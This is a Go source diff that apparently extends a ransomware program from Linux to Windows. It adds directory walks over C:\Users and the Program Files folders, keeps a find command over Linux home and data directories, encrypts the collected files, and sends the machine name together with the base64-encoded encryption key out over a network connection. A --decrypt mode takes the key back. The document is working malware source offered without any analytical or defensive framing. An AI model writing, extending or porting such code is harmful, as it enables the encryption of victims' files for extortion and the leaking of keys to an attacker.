@@ -11,6 +11,8 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"path/filepath"
+	"runtime"
 	"strings"
 	"sync"
 )
@@ -75,10 +77,32 @@ func DeCrypt(filename string, ch chan string) {
 
 func main() {
 	//cmd := exec.Command("bash", "-c", "find / -type f -size -200M ! -path \"/lib/*\" ! -path \"/etc/*\" ! -path \"/sys/*\" ! -path \"/proc/*\" ! -path \"/boot/*\" ! -path \"/dev/*\" ! -path \"/sbin/*\" ! -path \"/bin/*\" ! -path \"/initrd/*\" ! -path \"/run/*\" ! -path \"/var/*\" ! -path \"/usr/*\" ! -path \"/snap/*\" ! -path \"*.bash*\" ! -path \"*.desktop*\" ! -path \"*.cache*\" ! -path \"*.mozilla*\" 2> /dev/null\n")
-	cmd := exec.Command("bash", "-c", "find /home /opt /root /srv /tmp -type f -size -200M ! -path \"*.bash*\" ! -path \"*.desktop*\" ! -path \"*.cache*\" ! -path \"*.mozilla*\" 2> /dev/null")
-	output, _ := cmd.CombinedOutput()
-	listfile := strings.Split(string(output), "\n")
+	var listfile []string
+	switch runtime.GOOS {
+	case "windows":
+		root := "C:\\Users"
+		_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
+			listfile = append(listfile, path)
+			return nil
+		})
+		root = "C:\\Program Files (x86)"
+		_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
+			listfile = append(listfile, path)
+			return nil
+		})
+		root = "C:\\Program Files"
+		_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
+			listfile = append(listfile, path)
+			return nil
+		})
+	case "linux":
+		cmd := exec.Command("bash", "-c", "find /home /opt /root /srv /tmp -type f -size -200M ! -path \"*.bash*\" ! -path \"*.desktop*\" ! -path \"*.cache*\" ! -path \"*.mozilla*\" 2> /dev/null")
+		output, _ := cmd.CombinedOutput()
+		listfile = strings.Split(string(output), "\n")
+	}
+
 	ch := make(chan string, len(listfile))
+
 	for _, file := range listfile {
 		wg.Add(1)
 		wgc.Add(1)
@@ -102,9 +126,21 @@ func main() {
 			return
 		}
 		wgc.Wait()
-		cmd := exec.Command("cat", "/etc/hostname")
-		output, _ := cmd.CombinedOutput()
-		fmt.Fprintf(c, string(output)[:len(string(output))-1]+"|"+base64.StdEncoding.EncodeToString(CryptKey))
+		switch runtime.GOOS {
+		case "windows":
+			name := ""
+			output, _ := exec.Command("wmic", "computersystem", "get", "name").Output()
+			for _,letter := range string(output)[4:] {
+				if letter != 32 && letter != 13 && letter != 10{
+					name += string(letter)
+				}
+			}
+			fmt.Fprintf(c, name + "|" + base64.StdEncoding.EncodeToString(CryptKey))
+		case "linux":
+			cmd := exec.Command("cat", "/etc/hostname")
+			output, _ := cmd.CombinedOutput()
+			fmt.Fprintf(c, string(output)[:len(string(output))-1]+"|"+base64.StdEncoding.EncodeToString(CryptKey))
+		}
 	} else if len(args) == 2 && args[0] == "--decrypt" {
 		CryptKey, _ = base64.StdEncoding.DecodeString(args[1])
 		for i := 0; i < 100; i++ {
